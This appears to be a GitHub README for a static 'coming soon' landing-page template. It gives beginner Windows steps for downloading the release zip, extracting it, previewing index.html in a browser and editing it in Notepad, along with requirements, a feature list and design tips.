# 🚀 coming-soon-site-template - Build professional landing pages with ease

[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/jeremiahbloodguilty747/coming-soon-site-template/releases)

This template helps you build a landing page for your project. You can show that your website is under construction while you build your main site. This tool contains the files you need to show a professional message to your visitors. It works on all modern web browsers.

## 📥 How to download the files

You need to save the template files to your computer before you start. Follow these steps to get the files.

1. Go to the [official release page](https://github.com/jeremiahbloodguilty747/coming-soon-site-template/releases).
2. Look for the section labeled Assets.
3. Click the link that ends in .zip to save the file.
4. Save this file in a folder you can find later, such as your Downloads folder.

## 🛠️ Setting up the template

Computers store files in compressed formats to save space. You must open this file before you see the contents.

1. Open your File Explorer. 
2. Go to the folder where you saved the file.
3. Right-click on the file you downloaded.
4. Select the Extract All option.
5. Choose a path on your computer for the files.
6. Click Extract.

Once you finish these steps, you see a new folder. This folder contains your website files. You can rename this folder to match your project name.

## 💻 How to view your website

You can view your new page in your internet browser. You do not need special tools to see how your site looks.

1. Open the folder you extracted in the previous step.
2. Find the file named index.html.
3. Right-click the file named index.html.
4. Select Open with.
5. Choose your favorite web browser from the menu.

Your browser now displays the landing page template. You can see how the text and colors appear to your future visitors.

## 📝 Making changes to your page

The template uses simple code that you can change with a basic text editor. You do not need advanced software to make your site unique.

1. Open your search bar on Windows.
2. Type Notepad and press Enter.
3. Click File and then Open inside Notepad.
4. Go to your project folder.
5. Change the file type filter at the bottom right from Text Documents to All Files.
6. Select index.html and click Open.

You see lines of text on the screen. Look for words inside tags that look like this: `<p>Example Text</p>`. You can delete the example text and type your own message. Make sure you do not delete the items inside the angle brackets.

When you finish your changes, click File and Save. Refresh your browser page to see your updates.

## ⚙️ Requirements for your computer

This template works on almost every computer. You only need a standard web browser and a basic text editor. We suggest the following:

- Windows 10 or Windows 11.
- A modern browser like Chrome, Edge, or Firefox.
- A basic text editor like Notepad.
- A small amount of storage space for the image and text files.

## 🌐 Common features

- Mobile-friendly design that adjusts to phone screens.
- Clean code that loads fast for your users.
- Easy sections for your contact info.
- Space to show a countdown timer for your launch.
- Simple layout that works for any industry.

## 🔗 Tips for your success

Use high-quality images to make your site look professional. Keep your text short and clear. Tell your visitors what your project does in one or two sentences. Add your social media links so people can follow your progress.

If you make a mistake while editing, you can always delete the folder and extract the original file from the zip archive again. This returns your site to the original state. You can try your changes as many times as you like.
